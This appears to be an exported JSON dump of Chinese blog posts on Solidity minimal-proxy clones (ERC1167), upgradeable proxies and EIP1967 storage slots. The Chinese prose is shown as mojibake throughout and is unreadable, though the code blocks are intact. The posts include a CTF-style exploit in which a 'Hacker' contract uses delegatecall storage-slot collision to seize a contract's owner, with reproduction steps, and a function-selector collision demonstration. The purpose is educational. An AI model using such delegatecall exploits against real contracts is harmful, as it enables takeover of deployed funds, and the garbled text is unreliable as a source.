0x2c: RETURN è¿™ä¸²å­—èŠ‚ç çš„æ‰§è¡Œçš„é€»è¾‘å°±æ˜¯å¯¹ 0xbebebebebebebebebebebebebebebebebebebebeåœ°å€æ‰§è¡Œdelegatecallï¼Œå¦‚æœè°ƒç”¨å¤±è´¥åˆ™revertï¼Œå¦‚æœè°ƒç”¨æˆåŠŸåˆ™è¿”å›ä»£ç†è°ƒç”¨è¿”å›çš„ç»“æœã€‚ å¯ä»¥è‡ªå·±ç”¨æ±‡ç¼–è¯­è¨€å†™å‡ºæ¥ï¼Œreturndataçš„éƒ¨åˆ†å¯èƒ½ä¸å¤ªå¯¹ï¼Œä½†æ˜¯å¤§ä½“é€»è¾‘æ˜¯è¿™æ ·çš„ã€‚ 12345678910111213assembly &#123; calldatacopy(0, 0, calldatasize()) let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) returndatacopy(0, 0, returndatasize()) switch result // delegatecall returns 0 on error. case 0 &#123; revert(0, returndatasize()) &#125; default &#123; return(0, returndatasize()) &#125;&#125; 2.3 å®ç°å¤åˆ¶åŠŸèƒ½è¦å¦‚ä½•å®ç°å…‹éš†åŠŸèƒ½ï¼Œå¯ä»¥å‚è€ƒopenzeppelinå®˜æ–¹çš„ä»£ç ã€‚ 123456789101112131415161718function clone(address implementation, uint256 value) internal returns (address instance) &#123; if (address(this).balance &lt; value) &#123; revert Errors.InsufficientBalance(address(this).balance, value); &#125; /// @solidity memory-safe-assembly assembly &#123; // Stores the bytecode after address mstore(0x20, 0x5af43d82803e903d91602b57fd5bf3) // implementation address mstore(0x11, implementation) // Packs the first 3 bytes of the `implementation` address with the bytecode before the address. mstore(0x00, or(shr(0x88, implementation), 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000)) instance := create(value, 0x09, 0x37) &#125; if (instance == address(0)) &#123; revert Errors.FailedDeployment(); &#125;&#125; ç›´æ¥çœ‹åˆ°æ±‡ç¼–éƒ¨åˆ†ï¼Œä¸‰ä¸ªmstoreæ“ä½œç çš„ä½œç”¨æ˜¯æ‹¼æ¥å…‹éš†åˆçº¦çš„createionCodeï¼Œæ‹¼æ¥çš„ç»“æœï¼š 10x3d602d80600a3d3981f3363d3d373d3d3d363d73 + implementation + 5af43d82803e903d91602b57fd5bf3 ç„¶åé€šè¿‡createæ“ä½œç éƒ¨ç½²å…‹éš†åˆçº¦ã€‚ æ¼”ç¤ºï¼š 12345678910111213141516171819202122232425262728293031323334// SPDX-License-Identifier: UNLICENSEDpragma solidity 0.8.22;import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/Clones.sol&quot;;contract Demo &#123; uint256 public num; fallback() external payable &#123; ++num; &#125;&#125;contract Test &#123; uint256 public num; event result(uint256); function call(address cloner) public &#123; cloner.call(&quot;aaa&quot;); // call fallback() (, bytes memory _result) = cloner.call(abi.encodeWithSignature(&quot;num()&quot;)); emit result(abi.decode(_result, (uint256))); &#125;&#125;contract CloneLib &#123; using Clones for address; function clone(address implementation) public returns (address cloner)&#123; cloner = implementation.clone(); &#125;&#125; å…ˆéƒ¨ç½² Demoåˆçº¦ éƒ¨ç½²CloneLibåˆçº¦ï¼Œå¹¶è°ƒç”¨cloneå‡½æ•°ï¼Œå¹¶ä¼ å…¥Demoåˆçº¦åœ°å€ æœ€åéƒ¨ç½²Teståˆçº¦ï¼Œå¹¶è°ƒç”¨callå‡½æ•°ï¼Œä¼ å…¥å…‹éš†åœ°å€ ç»“æœï¼š å¯ä»¥çœ‹åˆ°ç»“æœè¿”å›1ï¼Œè¯´æ˜å…‹éš†æˆåŠŸã€‚ åŒç†ï¼ŒçŸ¥é“äº†å…‹éš†çš„é€»è¾‘ï¼Œå¯ä»¥ç”¨å¦ä¸€ç§æ–¹å¼å¤ç°ï¼š 1234567891011121314151617contract Clone &#123; uint256 public num; event a(bytes); constructor(address implementation) &#123; bytes memory head = hex&quot;363d3d373d3d3d363d73&quot;; bytes memory tail = hex&quot;5af43d82803e903d91602b57fd5bf3&quot;; bytes memory runtimeCode = abi.encodePacked(head, implementation, tail); emit a(runtimeCode); assembly &#123; return(add(runtimeCode, 0x20), mload(runtimeCode)) &#125; &#125;&#125; solidityçš„æ™ºèƒ½åˆçº¦æ‰§è¡Œçš„é€»è¾‘éƒ½æ˜¯é€šè¿‡runtimeCodeï¼Œè€Œåªè¦å°†åˆçº¦runtimeCodeéƒ¨åˆ†çš„å†…å®¹æŒ‰å…‹éš†åˆçº¦çš„é€»è¾‘ç¼–å†™ï¼Œå³ç…§æ ·ä¹Ÿå¯ä»¥å®Œæˆç›¸åŒçš„è¦æ±‚ã€‚ æ‰§è¡Œæ“ä½œç›¸åŒï¼Œæ‰§è¡Œç»“æœä¸ºï¼š 3. èŠ‚çœgasè´¹ç”¨é€šè¿‡éƒ¨ç½²åŸåˆçº¦å’Œéƒ¨ç½²å…‹éš†åˆçº¦æ‰€éœ€çš„gasè´¹çš„å¤šå°‘æ¥åˆ¤æ–­ éƒ¨ç½²Demoæ‰€éœ€çš„gasè´¹ç”¨ä¸ºï¼š&quot;122325&quot; éƒ¨ç½²å…‹éš†åˆçº¦æ‰€éœ€çš„gasè´¹ç”¨ä¸ºï¼š&quot;63334&quot; å¯ä»¥çœ‹åˆ°å‡ ä¹æ˜¯èŠ‚çœäº†ä¸€å€çš„èŠ±é”€ã€‚","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC1167","slug":"ERC1167","permalink":"https://biyouqiuqiu.com/tags/ERC1167/"}]},{"title":"Upgradeable Contract with delegatecall","slug":"DEFI/Proxy/æ·±å…¥å¯å‡çº§åˆçº¦-ä»£ç†ç¯‡","date":"2024-01-22T04:00:00.000Z","updated":"2024-01-22T04:00:00.000Z","comments":true,"path":"2024/01/22/DEFI/Proxy/æ·±å…¥å¯å‡çº§åˆçº¦-ä»£ç†ç¯‡/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/22/DEFI/Proxy/%E6%B7%B1%E5%85%A5%E5%8F%AF%E5%8D%87%E7%BA%A7%E5%90%88%E7%BA%A6-%E4%BB%A3%E7%90%86%E7%AF%87/","excerpt":"","text":"1. å‰è¨€ åˆçº¦å‡çº§ä»£ç†æ¨¡å¼æ˜¯é€šè¿‡ delegatecallæ“ä½œç å®ç°çš„ï¼Œè€Œè¿™ä¸€æ“ä½œç çš„ç‰¹ç‚¹ä¾¿æ˜¯ï¼Œä»£ç çš„æ•°æ®æ¥è‡ªäºä»£ç†åˆçº¦ï¼Œæ‰§è¡Œé€»è¾‘æ¥è‡ªäºé€»è¾‘åˆçº¦ã€‚åŒæ—¶æ­£æ˜¯ç”±äºè¿™ä¸ªç‰¹æ€§å®¹æ˜“å¼•å‘æ’æ§½å†²çªé—®é¢˜ã€‚ delegatecallçš„ä½¿ç”¨æ–¹å¼å°±ä¸å¤šè¯´äº†ï¼Œä¸æ‡‚çš„å¯ä»¥å»çœ‹çœ‹è¿™ç¯‡æ–‡ç« ã€‚ å…ˆæ¥ç®€å•äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯æ’æ§½å†²çªï¼Œè¿™æ˜¯ solidity CTF æœ€å¸¸è§çš„ä¸€ç§è€ƒå¯Ÿæ–¹å¼ã€‚ ä¸¾ä¸ªæœ€ç®€å•çš„ä¾‹å­ï¼š 123456789101112131415// SPDX-License-Identifier: MITpragma solidity ^0.8.20;contract Challenge &#123; address public owner; constructor() &#123; owner = msg.sender; &#125; function pwn(address hacker) external &#123; hacker.delegatecall(&quot;&quot;); &#125;&#125; æ¯”å¦‚è¿™é“é¢˜ï¼Œé€šè¿‡çš„æ¡ä»¶æ˜¯æˆä¸ºChallengeåˆçº¦çš„æ‰€æœ‰è€…ï¼Œç†Ÿæ‚‰delegatecallåŸç†çš„å¾ˆå®¹æ˜“æƒ³åˆ°ï¼Œå¯ä»¥åˆ©ç”¨åˆçº¦æ‰§è¡Œçš„ä¸Šä¸‹æ–‡åœ¨Challengeä¸­ï¼Œè€Œæ‰§è¡Œçš„é€»è¾‘æ¥è‡ªhackeråœ°å€ã€‚ å› æ­¤ï¼Œæ”»å‡»åˆçº¦å¯ä»¥è¿™æ ·å†™ï¼š 12345678contract Hacker &#123; address public addr; fallback() external &#123; addr = msg.sender; &#125;&#125; å¤ç°ï¼š éƒ¨ç½²Challegeåˆçº¦ åˆ‡æ¢EOAè´¦æˆ· éƒ¨ç½²Hackeråˆçº¦ è°ƒç”¨pwn()å‡½æ•°ï¼Œå¹¶ä¼ å…¥Hackerçš„åœ°å€ æ‰§è¡Œä¹‹åï¼Œå¯ä»¥çœ‹åˆ°ownerçš„å€¼å·²ç»å‘ç”Ÿäº†å˜åŒ– ç”»å›¾ç†è§£ï¼š ç®€å•æ¥è¯´ï¼ŒHackeråœ¨å›è°ƒå‡½æ•°ä¸­ä¿®æ”¹çš„ownerå…¶å®æ˜¯Challengeä¸­çš„ownerã€‚å› æ­¤æ’æ§½å†²çªå°±å¯ä»¥çœ‹ä½œæ˜¯ï¼Œé€»è¾‘åˆçº¦å’Œä»£ç†åˆçº¦ä¸­å…·æœ‰ç›¸åŒæ’æ§½ä½ç½®çš„å˜é‡ï¼Œå¯èƒ½ä¼šå› ä¸ºæ“ä½œé€»è¾‘åˆçº¦ä¸­çš„å˜é‡ä»è€Œè¦†ç›–æ‰ä»£ç†åˆçº¦ä¸­çš„å˜é‡å€¼ã€‚ 2. ç®€å•çš„å¯å‡çº§åˆçº¦ç®€å•çš„å¯å‡çº§åˆçº¦çš„å®ç°åŸç†æ˜¯ï¼šéƒ¨ç½²ä¸€ä¸ªä»£ç†åˆçº¦ï¼Œä»£ç†åˆçº¦é€šè¿‡å§”æ‰˜è°ƒç”¨çš„å½¢å¼å»è°ƒç”¨é€»è¾‘åˆçº¦ï¼Œå¦‚æœè¦è¿›è¡Œåˆçº¦å‡çº§ï¼Œåªè¦å°†ä»£ç†åˆçº¦ä¸­çš„ å®ç°åˆçº¦ï¼ˆä¹Ÿå«é€»è¾‘åˆçº¦ï¼‰æ›¿æ¢æ‰å³å¯ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼šæ›´æ¢é€»è¾‘åˆçº¦çš„å‡½æ•°éœ€è¦æœ‰ä¸¥æ ¼çš„è®¿é—®æ§åˆ¶ï¼Œä¸èƒ½éšä¾¿ç»™å…¶ä»–äººè°ƒç”¨ã€‚ ç¤ºæ„å›¾ï¼š 2.1 å¤ç°å¯å‡çº§åˆçº¦1234567891011121314151617181920212223242526// SPDX-License-Identifier: MITpragma solidity ^0.8.21;// ç®€å•çš„å¯å‡çº§åˆçº¦ï¼Œç®¡ç†å‘˜å¯ä»¥é€šè¿‡å‡çº§å‡½æ•°æ›´æ”¹é€»è¾‘åˆçº¦åœ°å€ï¼Œä»è€Œæ”¹å˜åˆçº¦çš„é€»è¾‘ã€‚contract SimpleUpgrade &#123; address public implementation; // é€»è¾‘åˆçº¦åœ°å€ address public admin; // adminåœ°å€ string public words; // å­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡é€»è¾‘åˆçº¦çš„å‡½æ•°æ”¹å˜ // æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–adminå’Œé€»è¾‘åˆçº¦åœ°å€ constructor(address _implementation)&#123; admin = msg.sender; implementation = _implementation; &#125; // fallbackå‡½æ•°ï¼Œå°†è°ƒç”¨å§”æ‰˜ç»™é€»è¾‘åˆçº¦ fallback() external payable &#123; (bool success, bytes memory data) = implementation.delegatecall(msg.data); &#125; // å‡çº§å‡½æ•°ï¼Œæ”¹å˜é€»è¾‘åˆçº¦åœ°å€ï¼Œåªèƒ½ç”±adminè°ƒç”¨ function upgrade(address newImplementation) external &#123; require(msg.sender == admin); implementation = newImplementation; &#125;&#125; è¿™æ˜¯ä¸€ä¸ªç®€å•çš„ä»£ç†åˆçº¦ï¼Œæ„é€ å‡½æ•°åˆå§‹åŒ–äº†adminä»¥åŠimplementationã€‚ 1234567891011contract Logic1 &#123; // çŠ¶æ€å˜é‡å’Œproxyåˆçº¦ä¸€è‡´ï¼Œé˜²æ­¢æ’æ§½å†²çª address public implementation; address public admin; string public words; // å­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡é€»è¾‘åˆçº¦çš„å‡½æ•°æ”¹å˜ // æ”¹å˜proxyä¸­çŠ¶æ€å˜é‡ï¼Œé€‰æ‹©å™¨ï¼š 0xc2985578 function foo() public&#123; words = &quot;old&quot;; &#125;&#125; è¿™æ˜¯V1ç‰ˆæœ¬çš„é€»è¾‘åˆçº¦ï¼Œé€»è¾‘åˆçº¦ä¸­å¾ˆæ˜æ˜¾æœ‰ä¸¤ä¸ªâ€œæ— ç”¨â€çš„å˜é‡ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥åˆ æ‰å‘¢ï¼Ÿ ç­”æ¡ˆï¼šå› ä¸ºè¿™æ˜¯é¿å…æ’æ§½å†²çªï¼Œå‰é¢æˆ‘å·²ç»è®²äº†ã€‚ 1234567891011contract Logic2 &#123; // çŠ¶æ€å˜é‡å’Œproxyåˆçº¦ä¸€è‡´ï¼Œé˜²æ­¢æ’æ§½å†²çª address public implementation; address public admin; string public words; // å­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡é€»è¾‘åˆçº¦çš„å‡½æ•°æ”¹å˜ // æ”¹å˜proxyä¸­çŠ¶æ€å˜é‡ï¼Œé€‰æ‹©å™¨ï¼š0xc2985578 function foo() public&#123; words = &quot;new&quot;; &#125;&#125; è¿™æ˜¯v2ç‰ˆæœ¬çš„é€»è¾‘åˆçº¦ï¼ŒåŒæ ·éœ€è¦ä¿è¯æ’æ§½çš„ä¸€è‡´æ€§ã€‚ å¤ç°é€»è¾‘ï¼š éƒ¨ç½²Logic1åˆçº¦ã€‚ éƒ¨ç½²SimpleUpgradeåˆçº¦ï¼Œä¼ å…¥Logic1çš„åœ°å€ã€‚ é€šè¿‡remixå‘å¯å‡çº§åˆçº¦ä¼ å…¥å‡½æ•°é€‰æ‹©å™¨ã€‚ å¯ä»¥çœ‹åˆ°wordsè¿”å›çš„ç»“æœæ˜¯oldã€‚ è¿›è¡Œåˆçº¦å‡çº§ï¼Œéƒ¨ç½²Logic2ï¼Œè®©adminè°ƒç”¨SimpleUpgradeåˆçº¦çš„å‡çº§å‡½æ•°upgrade()ã€‚ å†æ¬¡é€šè¿‡remixå‘å¯å‡çº§åˆçº¦ä¼ å…¥å‡½æ•°é€‰æ‹©å™¨ã€‚ å¯ä»¥çœ‹åˆ°wordsè¿”å›çš„ç»“æœå·²ç»å˜æˆnewäº†ï¼Œè¯´æ˜åˆçº¦å‡çº§æˆåŠŸã€‚ æ³¨æ„ï¼šå®é™…ä¸Šè¿™é‡Œéœ€è¦æœ‰ä¸¥æ ¼çš„è®¿é—®æ§åˆ¶ï¼Œå‡çº§å‡½æ•°ä¸èƒ½éšæ„ç»™ä»–äººè°ƒç”¨ã€‚ 2.2 ç¼ºé™·2.2.1 æ’æ§½å†²çªå’Œä»£ç å†—ä½™123456|Proxy |Implementation ||--------------------------|-------------------------||address _implementation |address _owner | &lt;=== æ’æ§½å†²çª|... |mapping _balances || |uint256 _supply || |... | è¿™ç±»å‡çº§æ–¹å¼ä¼šå­˜åœ¨æ’æ§½å†²çªï¼Œå¦‚æœæƒ³è¦è§£å†³è¿™ä¸ªå†²çªé—®é¢˜ï¼Œåˆ™å¿…é¡»è¦åœ¨é€»è¾‘åˆçº¦ä¸­ï¼Œä¸¥æ ¼æŒ‰ç…§ä»£ç†åˆçº¦ä¸­çŠ¶æ€å˜é‡çš„å£°æ˜é¡ºåºï¼Œåœ¨é€»è¾‘åˆçº¦ä¸­é‡å£°ä¸€éï¼Œä»¥æ­¤æ¥è§£å†³å†²çªé—®é¢˜ã€‚ä½†æ˜¯è¿™æ ·ä¸€æ¥ä¼šé€ æˆä»£ç å†—ä½™ï¼Œè€Œä¸”åœ¨ä»¥å¤ªåŠä¸Šçš„gasè´¹ç”¨å¾ˆè´µï¼ŒçŠ¶æ€å˜é‡çš„å­˜å‚¨æ–¹å¼ä¸ºstorageï¼Œå ç”¨ä¸€ä¸ªæ§½çš„è´¹ç”¨æ˜¯20000gasï¼Œå¦‚æœä»£ç†åˆçº¦ä¸­çš„çŠ¶æ€å˜é‡çš„æ•°é‡å¾ˆå¤šï¼Œé‚£ä¹ˆä¼šå¯¼è‡´å‡çº§çš„æˆæœ¬å˜å¾—å¾ˆé«˜ã€‚ ä½†æ˜¯å¦‚æœä¸å£°æ˜è¿™äº›å˜é‡ï¼Œåˆ™ä¼šé€ æˆæ’æ§½å†²çªã€‚ 2.2.2 é€‰æ‹©å™¨ç¢°æ’å…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯é€‰æ‹©å™¨ç¢°æ’ã€‚ éƒ½çŸ¥é“åœ¨æ™ºèƒ½åˆçº¦çš„ä»£ç æ‰§è¡Œä¸­ï¼Œå‡½æ•°çš„è°ƒç”¨æ˜¯é€šè¿‡å‡½æ•°é€‰æ‹©å™¨æ¥åŒ¹é…çš„ï¼Œå¦‚æœè¯´åœ¨ä»£ç ä¸­æœ‰ä¸¤ä¸ªå‡½æ•°çš„å‡½æ•°é€‰æ‹©å™¨æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆä»£ç å°†æ— æ³•æ‰¾åˆ°msg.senderæƒ³è¦è°ƒç”¨çš„å‡½æ•°ï¼Œä»è€Œå¯¼è‡´å‡½æ•°è°ƒç”¨è¢«revert()ã€‚ æ˜¾ç„¶ï¼Œåœ¨åŒä¸€ä¸ªåˆçº¦ä¸­ä¸å¯èƒ½å‡ºç°ä¸¤ä¸ªå‡½æ•°é€‰æ‹©å™¨ä¸€æ ·çš„å‡½æ•°ï¼Œè¿™æ˜¯è¿ç¼–è¯‘éƒ½ä¸èƒ½é€šè¿‡çš„ã€‚å¯ä»£ç†æ¨¡å¼ä¸ä¸€æ ·ï¼Œä»£ç†åˆçº¦å’Œé€»è¾‘åˆçº¦æ˜¯åˆ†å¼€çš„ï¼Œå°±ç®—ä»–ä»¬ä¹‹é—´å­˜åœ¨â€œé€‰æ‹©å™¨å†²çªâ€ä¹Ÿå¯ä»¥æ­£å¸¸ç¼–è¯‘ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å¾ˆä¸¥é‡çš„å®‰å…¨äº‹æ•…ã€‚ ä¾‹å­ï¼šå‡å¦‚é€»è¾‘åˆçº¦çš„ aå‡½æ•°å’Œä»£ç†åˆçº¦ä¸­çš„çš„å‡çº§å‡½æ•°é€‰æ‹©å™¨ç›¸åŒï¼Œé‚£ä¹ˆç®¡ç†äººå°±ä¼šåœ¨è°ƒç”¨aå‡½æ•°çš„æ—¶å€™ï¼Œå°†ä»£ç†åˆçº¦å‡çº§æˆä¸€ä¸ªé»‘æ´åˆçº¦ã€‚ ä»£ç å¤ç°ï¼š å·²çŸ¥burn(uint256)å’Œcollate_propagate_storage(bytes16)å‡½æ•°çš„å‡½æ•°é€‰æ‹©å™¨éƒ½ä¸º0x42966c68ã€‚ å‡è®¾ä»£ç†åˆçº¦çš„å‡çº§å‡½æ•°ä¸ºburn(uint256)ï¼Œæ­¤æ—¶åˆçº¦ç®¡ç†äººé€šè¿‡ä»£ç†åˆçº¦è°ƒç”¨collate_propagate_storage(bytes16)å‡½æ•°ï¼Œå®é™…çš„æ‰§è¡Œå¹¶ä¸ä¼šé€šè¿‡fallback()å»å§”æ‰˜è°ƒç”¨ï¼Œè€Œæ˜¯æ‰§è¡Œä»£ç†åˆçº¦ä¸­çš„burn(uint256)ã€‚ 12345678910111213141516171819202122232425262728293031323334353637// SPDX-License-Identifier: MITpragma solidity ^0.8.21;import &quot;hardhat/console.sol&quot;;contract SelectorCrash &#123; address public implementation; constructor(address _implementation)&#123; implementation = _implementation; &#125; fallback() external payable &#123; bytes memory _calldata = abi.encodeWithSignature(&quot;burn(uint256)&quot;, uint256(0)); (bool success, bytes memory data) = implementation.delegatecall(_calldata); &#125; function burn(uint256 num) external &#123; console.log(&quot;SelectorCrash Contract&quot;); &#125;&#125;contract Hacker &#123; function collate_propagate_storage(bytes16) external &#123; console.log(&quot;Hacker Contract&quot;); &#125;&#125;contract Test &#123; function test(address _crash) external &#123; (bool ok,) = _crash.call(abi.encodeWithSelector(Hacker.collate_propagate_storage.selector, bytes16(0))); console.log(&quot;ok=&gt;&quot;, ok); &#125;&#125; ä»£ç†åˆçº¦çš„ç®¡ç†äººé€šè¿‡Teståˆçº¦è°ƒç”¨collate_propagate_storag()å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°è¾“å‡ºç»“æœä¸ºï¼š ä¹Ÿå°±æ˜¯è¯´æ˜ï¼Œè¢«è°ƒç”¨çš„å‡½æ•°æ˜¯SelectorCrashåˆçº¦ä¸­çš„burn(uint256)å‡½æ•°ã€‚ é’ˆå¯¹å¦‚ä¸Šé—®é¢˜ï¼Œç°å·²æœ‰è§£å†³æ–¹æ³•ï¼Œè§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š 3. EIP1967 proxy3.1 éç»“æ„åŒ–å­˜å‚¨æˆ‘ä¹‹å‰æœ‰ç¯‡æ–‡ç« å†™è¿‡å…³äºå¯¹ EIP1967çš„è§£è¯»ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å»çœ‹çœ‹ã€‚ åœ¨å­¦ä¹ è¯¥ä»£ç†æ—¶ï¼Œéœ€è¦äº†è§£ä»€ä¹ˆæ˜¯éç»“æ„åŒ–å­˜å‚¨ã€‚ ä¸Šé¢å·²ç»è¯´äº† EVMå­˜å‚¨æ•°æ®çš„æœºåˆ¶ï¼Œä¹Ÿè¯´äº†æ’æ§½å†²çªã€‚ å‡è®¾ä»£ç†å°†é€»è¾‘åˆçº¦çš„åœ°å€å­˜å‚¨åœ¨å…¶å”¯ä¸€å˜é‡ ä¸­address public _implementation;ã€‚ç°åœ¨ï¼Œå‡è®¾é€»è¾‘åˆçº¦æ˜¯ä¸€ä¸ªåŸºæœ¬ä»£å¸ï¼Œå…¶ç¬¬ä¸€ä¸ªå˜é‡æ˜¯address public _ownerã€‚è¿™ä¸¤ä¸ªå˜é‡çš„å¤§å°å‡ä¸º 32 å­—èŠ‚ï¼Œæ® EVM æ‰€çŸ¥ï¼Œå®ƒä»¬å æ®ä»£ç†è°ƒç”¨ç»“æœæ‰§è¡Œæµçš„ç¬¬ä¸€ä¸ªæ§½ã€‚å½“é€»è¾‘åˆçº¦å†™å…¥ æ—¶_ownerï¼Œå®ƒæ˜¯åœ¨ä»£ç†çŠ¶æ€çš„èŒƒå›´å†…è¿›è¡Œçš„ï¼Œå¹¶ä¸”å®é™…ä¸Šå†™å…¥çš„æ˜¯_implementationã€‚è¿™ä¸ªé—®é¢˜å¯ä»¥ç§°ä¸ºâ€œå­˜å‚¨å†²çªâ€ã€‚ 123456|Proxy |Implementation ||--------------------------|-------------------------||address _implementation |address _owner | &lt;=== Slot collision!|... |mapping _balances || |uint256 _supply || |... | æœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥å…‹æœè¿™ä¸ªé—®é¢˜ï¼ŒOpenZeppelin Upgrades å®ç°çš„â€œéç»“æ„åŒ–å­˜å‚¨â€æ–¹æ³•çš„å·¥ä½œåŸç†å¦‚ä¸‹ã€‚å®ƒæ²¡æœ‰å°†_implementationåœ°å€å­˜å‚¨åœ¨ä»£ç†çš„ç¬¬ä¸€ä¸ªå­˜å‚¨æ§½ä¸­ï¼Œè€Œæ˜¯é€‰æ‹©ä¼ªéšæœºæ§½ã€‚è¯¥æ§½è¶³å¤Ÿéšæœºï¼Œé€»è¾‘åˆçº¦åœ¨åŒä¸€æ§½å£°æ˜å˜é‡çš„æ¦‚ç‡å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚ä»£ç†å­˜å‚¨ä¸­çš„éšæœºæ§½ä½ç½®çš„ç›¸åŒåŸç†ä¹Ÿé€‚ç”¨äºä»£ç†å¯èƒ½å…·æœ‰çš„ä»»ä½•å…¶ä»–å˜é‡ï¼Œä¾‹å¦‚ç®¡ç†åœ°å€ï¼ˆå…è®¸æ›´æ–° çš„å€¼_implementationï¼‰ç­‰ã€‚ 12345678910111213|Proxy |Implementation ||--------------------------|-------------------------||... |address _owner ||... |mapping _balances ||... |uint256 _supply ||... |... ||... | ||... | ||... | ||... | ||address _implementation | | &lt;=== Randomized slot.|... | ||... | | æ¯”å¦‚åœ¨ä¸Šè¿°çš„ ç®€å•çš„å¯å‡çº§åˆçº¦æ¡ˆä¾‹ä¸­ï¼Œä»£ç†åˆçº¦çš„slot0å­˜å‚¨çš„æ˜¯é€»è¾‘åˆçº¦çš„åœ°å€ï¼Œå¦‚æœé€»è¾‘åˆçº¦ä¸­ä¹Ÿæœ‰çŠ¶æ€å˜é‡åˆ™å¾ˆå¯èƒ½ä¼šå‘ç”Ÿæ’æ§½å†²çªï¼ŒEIP1967çš„è§£å†³æ–¹å¼æ˜¯ï¼Œå°†implementationçš„åœ°å€å­˜å‚¨åœ¨éšæœºä½ç½®ï¼Œè¯¥éšæœºä½ç½®çš„è®¡ç®—æ–¹æ³•å¦‚ä¸‹ï¼š 12bytes32 private constant implementationPosition = bytes32(uint256( keccak256(&#x27;eip1967.proxy.implementation&#x27;)) - 1)); é‚£ä¹ˆä¼šæœ‰äººå¥½å¥‡ï¼Œä¸ºä»€ä¹ˆè¿™æ ·ä¼šé¿å…æ’æ§½å†²çªå‘¢ã€‚å› ä¸ºkeccak256(&#39;eip1967.proxy.implementation&#39;)) - 1)çš„å“ˆå¸Œç»“æœæ˜¯ä¸€ä¸ªå¾ˆåºå¤§çš„æ•°å€¼ï¼Œè¦æ˜¯æƒ³å®ç°æ’æ§½å†²çªé‚£å¾—å£°æ˜å¤šå°‘å˜é‡ï¼Œè€Œåˆçº¦çš„å¤§å°æœ€å¤§åªèƒ½ä¸º24kbï¼Œå…‰éƒ¨ç½²çš„æˆæœ¬éƒ½å·²ç»éå¸¸é«˜äº†ï¼Œä½œä¸ºæ™ºèƒ½åˆçº¦çš„å¼€å‘è€…ç»å¯¹ä¸ä¼šå…è®¸è¿™ç§æƒ…å†µå‘ç”Ÿã€‚ 3.2 å¤ç°å¤ç°çš„é€»è¾‘æ˜¯å¼•ç”¨ OZ åº“çš„ ERC1967Proxy.solï¼Œæ—¨åœ¨è§£å†³ä¸Šè¿°ä¾‹å­ä¸­çš„æ’æ§½å†²çªå’Œé€»è¾‘åˆçº¦ä»£ç å†—ä½™é—®é¢˜ï¼Œæˆ‘å‡†å¤‡åœ¨é€»è¾‘åˆçº¦ä¸­ä»slot0, slot1, slot2...ä¾æ¬¡å£°æ˜è¾ƒå¤šçŠ¶æ€å˜é‡ï¼Œè€Œä¸åƒç®€å•çš„å¯å‡çº§åˆçº¦æ¡ˆä¾‹ä¸­é¢„ç•™ä»£ç†åˆçº¦å£°æ˜çš„çŠ¶æ€å˜é‡ã€‚ 123456789101112131415161718192021222324252627// SPDX-License-Identifier: MITpragma solidity ^0.8.20;import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/ERC1967/ERC1967Proxy.sol&quot;;contract Proxy_Test is ERC1967Proxy &#123; constructor(address implementation) ERC1967Proxy(implementation, &quot;&quot;) &#123;&#125;&#125;contract Logic &#123; uint256 public a; uint256 public b; uint256 public c; uint256 public d; uint256 public e; uint256 public f; function set() public &#123; a = 0; b = 1; c = 2; d = 3; e = 4; f = 5; &#125;&#125; åŒ–ç¹ä¸ºç®€ï¼Œå°±ä¸æé‚£ä¹ˆå¤æ‚äº†ã€‚æ—¨åœ¨éªŒè¯é€šè¿‡Proxy_Teståˆçº¦ï¼Œå§”æ‰˜è°ƒç”¨Logicåˆçº¦çš„set()å‡½æ•°ï¼ŒéªŒè¯æ˜¯å¦ä¼šå‘ç”Ÿæ’æ§½å†²çªï¼Œä»¥åŠéªŒè¯Logicåˆçº¦çš„çŠ¶æ€å˜é‡æ˜¯å¦è¢«å†™å…¥é€»è¾‘åˆçº¦ä¸­ã€‚ æ‰§è¡Œé€»è¾‘ï¼š éƒ¨ç½²Logicåˆçº¦ï¼Œå°†å…¶åœ°å€ä½œä¸ºå‚æ•°ä¼ å…¥Proxy_Teståˆçº¦ã€‚ é€šè¿‡Proxy_Testè°ƒç”¨set()å‡½æ•°ã€‚ é€šè¿‡è„šæœ¬éªŒè¯å„ä¸ªæ’æ§½çš„å€¼ï¼š å¯ä»¥çœ‹åˆ°è¿™æ²¡æœ‰å‘ç”Ÿæ’æ§½å†²çªï¼Œimplementationçš„å€¼æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œä»¥åŠé€»è¾‘åˆçº¦çš„çŠ¶æ€å˜é‡çš„ç¡®è¢«å†™å…¥äº†ä»£ç†åˆçº¦ä¸­ã€‚ æˆ‘æ˜¯åœ¨æœ¬åœ°å¼€å¯äº†æµ‹è¯•èŠ‚ç‚¹ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š 1234567891011121314151617import &#123; ethers &#125; from &quot;ethers&quot;;const URL = &quot;HTTP://127.0.0.1:8545&quot;;const provider = new ethers.JsonRpcProvider(URL);let address = &quot;0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9&quot;;async function print() &#123; for (let i = 0; i &lt; 6; i++) &#123; let slot = await provider.getStorage(address, i); console.log(`slot$&#123;i&#125; = $&#123;slot&#125;`); &#125; let implementation = 